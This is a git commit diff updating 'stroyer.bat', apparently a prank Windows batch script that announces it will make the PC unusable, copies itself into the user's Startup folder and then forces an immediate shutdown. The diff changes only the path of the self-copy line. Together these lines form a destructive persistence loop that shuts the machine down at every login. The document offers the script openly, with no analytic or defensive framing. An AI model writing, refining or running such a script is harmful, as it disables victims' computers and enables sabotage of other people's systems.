78cfa66e690f193f1eb4c6c7adb9c5c827d87c7b
bruh gaming <92724167+bruhfromcollabvm@users.noreply.github.com>
2022-10-04 11:27:52 +0100

    Update stroyer.bat

--- stroyer.bat
+++ stroyer.bat
@@ -2,5 +2,5 @@
 echo WARNING THIS WILL MAKE THE PC UNUSABLE
 pause
 echo you asked for it m8
-copy "%USERPROFILE%\Downloads\forkie-stroyer.zip\forkie-stroyer-main\stroyer.bat" "%USERPROFILE%\Start Menu\Programs\Startup"
+copy "%USERPROFILE%\Downloads\forkie-stroyer-main.zip\forkie-stroyer-main\stroyer.bat" "%USERPROFILE%\Start Menu\Programs\Startup"
 shutdown -s -t -0
